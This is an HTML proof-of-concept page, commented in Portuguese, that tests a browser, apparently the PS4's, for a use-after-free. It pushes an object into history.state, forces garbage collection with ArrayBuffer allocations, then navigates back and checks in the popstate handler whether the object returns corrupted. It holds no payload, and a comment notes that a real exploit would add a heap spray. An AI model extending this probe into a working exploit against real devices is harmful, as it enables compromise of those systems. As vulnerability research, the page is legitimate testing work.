<!DOCTYPE html>
<html>
<head>
<title>PS4 History UAF PoC</title>
<style>
    body { background: #000; color: #0f0; font-family: monospace; font-size: 16px; }
    .log { border: 1px solid #333; padding: 10px; margin-top: 10px; }
</style>
</head>
<body>
    <h1>History State UAF Trigger</h1>
    <div id="status">Esperando comando...</div>
    <div class="log" id="logger"></div>
    <button onclick="startExploit()">INICIAR TESTE UAF</button>

    <script>
        const logger = document.getElementById('logger');
        
        function log(msg) {
            logger.innerHTML += "<div>" + msg + "</div>";
        }

        // Função para tentar forçar o Garbage Collector (GC)
        // Criando lixo na memória para forçar o browser a limpar coisas antigas
        function forceGC() {
            log("Forçando Garbage Collection...");
            try {
                var a = [];
                for (var i = 0; i < 100; i++) {
                    // Aloca 1MB por iteração
                    a.push(new ArrayBuffer(1024 * 1024)); 
                }
                a = null; // Solta a referência
                log("GC: Pressão de memória aplicada.");
            } catch (e) {
                log("GC: Memória cheia (Isso é bom).");
            }
        }

        function startExploit() {
            log("1. Criando objeto alvo...");
            
            // Criamos um objeto específico para rastrear na memória
            // Usamos um array de inteiros para facilitar a detecção de corrupção
            var targetObj = { 
                id: "ALVO_VULNERAVEL", 
                data: new Array(1000).fill(0x41414141) // Enche com 'AAAA'
            };

            // 2. Salva no histórico
            log("2. Empurrando para o history.state...");
            history.pushState(targetObj, "page1", "?state=1");

            // 3. Remove a referência local
            targetObj = null;
            log("3. Referência local removida.");

            // 4. Navega para criar distância
            history.pushState("LIXO", "page2", "?state=2");
            log("4. Navegou para novo estado (o alvo ficou pra trás).");

            // 5. Tenta forçar o navegador a esquecer/limpar o objeto do passo 2
            setTimeout(() => {
                forceGC(); // Tenta limpar a memória

                // Aqui faríamos um "Heap Spray" se fosse um exploit real
                // Para preencher o buraco deixado pelo objeto com código malicioso.
                // Neste teste, apenas verificamos se crasha ou corrompe.
                
                log("5. Tentando acessar o objeto antigo (history.back)...");
                
                // Volta para o estado 1
                history.back();

                // O bug acontece no evento 'popstate'
            }, 1000);
        }

        window.onpopstate = function(event) {
            log("6. Evento popstate disparado!");
            
            if (!event.state) {
                log("FALHA: O estado retornou nulo (Browser se protegeu).");
                return;
            }

            // Verifica se o objeto está intacto
            if (event.state.id === "ALVO_VULNERAVEL") {
                log("RESULTADO: Objeto recuperado intacto.");
                log("CONCLUSÃO: Browser gerenciou a memória corretamente (Sem UAF simples).");
            } else {
                // Se cair aqui, ou o ID mudou (Corrupção!) ou crashou antes
                log("CRÍTICO: Objeto corrompido ou tipo incorreto!");
                document.body.style.backgroundColor = "red";
                alert("POSSÍVEL VULNERABILIDADE ENCONTRADA!");
            }
        };
    </script>
</body>
</html>
